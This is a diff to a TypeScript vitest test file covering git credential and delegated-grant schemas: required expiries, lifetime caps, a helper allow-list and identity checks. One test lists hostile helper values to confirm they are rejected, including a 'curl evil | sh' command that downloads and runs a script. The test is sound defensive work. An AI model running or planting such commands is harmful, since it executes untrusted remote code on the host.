@@ -1,7 +1,7 @@
 import { describe, expect, it } from "vitest";
 import {
   ActingIdentityPolicySchema, AttributionSchema, ChangeRequestFeedbackSchema, ChangeRequestInputSchema, ChangeRequestStatusSchema, ChangeRequestUpdateSchema, CheckSchema,
-  CheckStartRequestSchema, CheckTargetSchema, CodeHostCapabilitiesSchema, CodeHostEventSchema, CODE_HOST_EVENT_TYPES, DelegatedGrantSchema, GitCredentialSchema,
+  CheckStartRequestSchema, CheckTargetSchema, DELEGATED_GRANT_MAX_LIFETIME_MS, GIT_CREDENTIAL_HELPERS, GIT_CREDENTIAL_MAX_LIFETIME_MS, workerGitCredentialUsable, CodeHostCapabilitiesSchema, CodeHostEventSchema, CODE_HOST_EVENT_TYPES, DelegatedGrantSchema, GitCredentialSchema,
   HostScopeSchema, MergeResultSchema, PluginKindSchema, TrackerEventSchema, TrackerItemSchema, actingIdentityModeAllowed, delegatedUseAllowed,
 } from "../../packages/contracts/src/plugins/index.js";
 
@@ -35,16 +35,45 @@ describe("code host capabilities", () => {
 });
 
 describe("git credentials", () => {
-  it("takes each of the four kinds with its own fields", () => {
-    expect(GitCredentialSchema.safeParse({ kind: "token", token: "t" }).success).toBe(true);
-    expect(GitCredentialSchema.safeParse({ kind: "basic", username: "u", password: "p" }).success).toBe(true);
-    expect(GitCredentialSchema.safeParse({ kind: "ssh-key", privateKey: "k" }).success).toBe(true);
-    expect(GitCredentialSchema.safeParse({ kind: "helper", helper: "h" }).success).toBe(true);
+  const NOW = Date.parse("2026-10-30T10:00:00.000Z");
+  const soon = new Date(NOW + 30 * 60_000).toISOString();
+  it("takes each of the four kinds with its own fields and an expiry", () => {
+    expect(GitCredentialSchema.safeParse({ kind: "token", token: "t", expiresAt: soon }).success).toBe(true);
+    expect(GitCredentialSchema.safeParse({ kind: "basic", username: "u", password: "p", expiresAt: soon }).success).toBe(true);
+    expect(GitCredentialSchema.safeParse({ kind: "ssh-key", privateKey: "k", expiresAt: soon }).success).toBe(true);
+    expect(GitCredentialSchema.safeParse({ kind: "helper", helper: "aws-codecommit", expiresAt: soon }).success).toBe(true);
+  });
+  it("refuses a credential with no expiry, whatever its kind", () => {
+    for (const credential of [{ kind: "token", token: "t" }, { kind: "basic", username: "u", password: "p" }, { kind: "ssh-key", privateKey: "k" }, { kind: "helper", helper: "aws-codecommit" }]) {
+      expect(GitCredentialSchema.safeParse(credential).success, credential.kind).toBe(false);
+      expect(workerGitCredentialUsable(credential, { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "invalid" });
+    }
+    expect(GitCredentialSchema.safeParse({ kind: "token", token: "t", expiresAt: "not a time" }).success).toBe(false);
   });
   it("refuses a kind with another kind's field, an empty secret and an unknown kind", () => {
-    expect(GitCredentialSchema.safeParse({ kind: "token", password: "p" }).success).toBe(false);
-    expect(GitCredentialSchema.safeParse({ kind: "token", token: "" }).success).toBe(false);
-    expect(GitCredentialSchema.safeParse({ kind: "cookie", token: "t" }).success).toBe(false);
+    expect(GitCredentialSchema.safeParse({ kind: "token", password: "p", expiresAt: soon }).success).toBe(false);
+    expect(GitCredentialSchema.safeParse({ kind: "token", token: "", expiresAt: soon }).success).toBe(false);
+    expect(GitCredentialSchema.safeParse({ kind: "cookie", token: "t", expiresAt: soon }).success).toBe(false);
+  });
+  it("takes a helper by name from a fixed list and never a command", () => {
+    expect([...GIT_CREDENTIAL_HELPERS]).toEqual(["aws-codecommit"]);
+    for (const helper of ["!sh -c 'curl evil | sh'", "!aws codecommit credential-helper $@", "store", "/usr/bin/helper", ""]) {
+      expect(GitCredentialSchema.safeParse({ kind: "helper", helper, expiresAt: soon }).success, helper).toBe(false);
+    }
+  });
+  it("hands a worker only a credential that is not expired and not more than an hour out", () => {
+    const token = (expiresAt: string) => ({ kind: "token", token: "t", expiresAt });
+    expect(workerGitCredentialUsable(token(soon), { now: NOW, actingAs: "service" })).toMatchObject({ ok: true });
+    expect(workerGitCredentialUsable(token(new Date(NOW).toISOString()), { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "expired" });
+    expect(workerGitCredentialUsable(token(new Date(NOW - 1).toISOString()), { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "expired" });
+    expect(workerGitCredentialUsable(token(new Date(NOW + GIT_CREDENTIAL_MAX_LIFETIME_MS).toISOString()), { now: NOW, actingAs: "service" })).toMatchObject({ ok: true });
+    expect(workerGitCredentialUsable(token(new Date(NOW + GIT_CREDENTIAL_MAX_LIFETIME_MS + 1).toISOString()), { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "too_long_lived" });
+    expect(workerGitCredentialUsable({ kind: "basic", username: "u", password: "p", expiresAt: new Date(NOW + 365 * 86_400_000).toISOString() }, { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "too_long_lived" });
+  });
+  it("lets an ssh key go to a worker only for a service identity", () => {
+    const key = { kind: "ssh-key", privateKey: "k", expiresAt: soon };
+    expect(workerGitCredentialUsable(key, { now: NOW, actingAs: "service" })).toMatchObject({ ok: true });
+    expect(workerGitCredentialUsable(key, { now: NOW, actingAs: "on-behalf-of" })).toEqual({ ok: false, reason: "ssh_key_needs_service_identity" });
   });
 });
 
@@ -167,15 +196,38 @@ describe("acting identity", () => {
     expect(AttributionSchema.safeParse({ approvedBy: attribution.approvedBy, taskId: "t" }).success).toBe(false);
   });
 
-  it("lets a delegated credential serve only its own task's writes at its own plug-in before it expires", () => {
-    const grant = DelegatedGrantSchema.parse({ plugin: "ghes", taskId: "t1", expiresAt: 2_000 });
-    const use = { plugin: "ghes", taskId: "t1", purpose: "task-write", now: 1_000 };
+  const DAY = 3_600_000;
+  const grantOf = (overrides: Record<string, unknown> = {}) => DelegatedGrantSchema.parse({ plugin: "ghes", taskId: "t1", grantedBy: hex64, purpose: "task-write", issuedAt: 1_000, expiresAt: 1_000 + DAY / 2, hostExpiresAt: 1_000 + DAY, ...overrides });
+
+  it("lets a delegated credential serve only its own task's writes, at its own plug-in, for the person who started or approved it, before it expires", () => {
+    const grant = grantOf();
+    const approver = "e".repeat(64);
+    const use = { plugin: "ghes", taskId: "t1", purpose: "task-write", now: 2_000, requestedBy: hex64, approvedBy: approver };
     expect(delegatedUseAllowed(grant, use)).toEqual({ ok: true });
     expect(delegatedUseAllowed(grant, { ...use, purpose: "approve" })).toEqual({ ok: false, reason: "not_a_task_write" });
     expect(delegatedUseAllowed(grant, { ...use, purpose: "merge" })).toEqual({ ok: false, reason: "not_a_task_write" });
     expect(delegatedUseAllowed(grant, { ...use, taskId: "t2" })).toEqual({ ok: false, reason: "other_task" });
     expect(delegatedUseAllowed(grant, { ...use, plugin: "github" })).toEqual({ ok: false, reason: "other_plugin" });
-    expect(delegatedUseAllowed(grant, { ...use, now: 2_000 })).toEqual({ ok: false, reason: "expired" });
+    expect(delegatedUseAllowed(grant, { ...use, now: grant.expiresAt })).toEqual({ ok: false, reason: "expired" });
     expect(delegatedUseAllowed(grant, { ...use, now: Number.NaN })).toEqual({ ok: false, reason: "expired" });
+  });
+
+  it("never serves a task the person who granted it did not start or approve", () => {
+    const grant = grantOf();
+    const use = { plugin: "ghes", taskId: "t1", purpose: "task-write", now: 2_000 };
+    const other = "f".repeat(64);
+    expect(delegatedUseAllowed(grant, { ...use, requestedBy: other })).toEqual({ ok: false, reason: "not_granted_by_a_task_person" });
+    expect(delegatedUseAllowed(grant, { ...use, requestedBy: other, approvedBy: other })).toEqual({ ok: false, reason: "not_granted_by_a_task_person" });
+    expect(delegatedUseAllowed(grant, { ...use, requestedBy: other, approvedBy: hex64 })).toEqual({ ok: true });
+  });
+
+  it("caps a grant at an hour, ties it to the person who granted it, and does not let it outlive the host's credential", () => {
+    expect(DelegatedGrantSchema.safeParse({ plugin: "ghes", taskId: "t1", purpose: "task-write", issuedAt: 1_000, expiresAt: 2_000, hostExpiresAt: 3_000 }).success).toBe(false);
+    expect(() => grantOf({ expiresAt: 1_000 + DELEGATED_GRANT_MAX_LIFETIME_MS + 1, hostExpiresAt: 1_000 + 2 * DAY })).toThrow();
+    expect(grantOf({ expiresAt: 1_000 + DELEGATED_GRANT_MAX_LIFETIME_MS, hostExpiresAt: 1_000 + DELEGATED_GRANT_MAX_LIFETIME_MS }).expiresAt).toBe(1_000 + DELEGATED_GRANT_MAX_LIFETIME_MS);
+    expect(() => grantOf({ expiresAt: 5_000, hostExpiresAt: 4_000 })).toThrow();
+    expect(() => grantOf({ expiresAt: 1_000 })).toThrow();
+    expect(() => grantOf({ purpose: "approve" })).toThrow();
+    expect(() => grantOf({ grantedBy: "short" })).toThrow();
   });
 });
